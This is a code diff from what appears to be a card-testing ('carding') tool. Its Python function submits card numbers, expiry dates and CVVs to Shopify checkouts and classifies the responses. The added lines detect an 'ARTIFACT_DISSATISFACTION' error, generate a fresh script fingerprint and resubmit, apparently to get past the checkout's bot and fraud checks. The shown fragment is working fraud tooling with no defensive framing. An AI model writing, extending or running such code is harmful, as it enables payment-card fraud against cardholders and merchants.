@@ -572,6 +572,22 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
             codes = [e.get('code', '') for e in errors if isinstance(e, dict)]
             technical = ['INVALID_VARIABLE', 'VALIDATION_CUSTOM', 'ARTIFACT_DISSATISFACTION', 'PAYMENTS_PROPOSED_GATEWAY_UNAVAILABLE', 'INPUT_VALIDATION_ERROR']
             if any(c in technical for c in codes):
+                # Retry with fresh script fingerprint
+                if 'ARTIFACT_DISSATISFACTION' in codes:
+                    completion_vars['input']['scriptFingerprint'] = _generate_script_fingerprint()
+                    completion_vars['input']['queueToken'] = latest_qt[0]
+                    text = await _do_submit()
+                    try:
+                        resp_json2 = json.loads(text)
+                        submit_data2 = resp_json2.get('data', {}).get('submitForCompletion', {})
+                        typename2 = submit_data2.get('__typename', '')
+                        if typename2 in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
+                            receipt_id = submit_data2.get('receipt', {}).get('id')
+                        elif typename2 == 'SubmitRejected':
+                            codes2 = [e.get('code', '') for e in submit_data2.get('errors', []) if isinstance(e, dict)]
+                            return running_total, f"Declined - {', '.join(codes2[:2])}", gw_name, None
+                    except:
+                        pass
                 return None, f"Gateway Error - {', '.join([c for c in codes if c][:2])}", gw_name, None
             if 'CAPTCHA_METADATA_MISSING' in codes or 'CHECKPOINT_DENIED' in codes:
                 return None, "Checkpoint Denied", gw_name, None
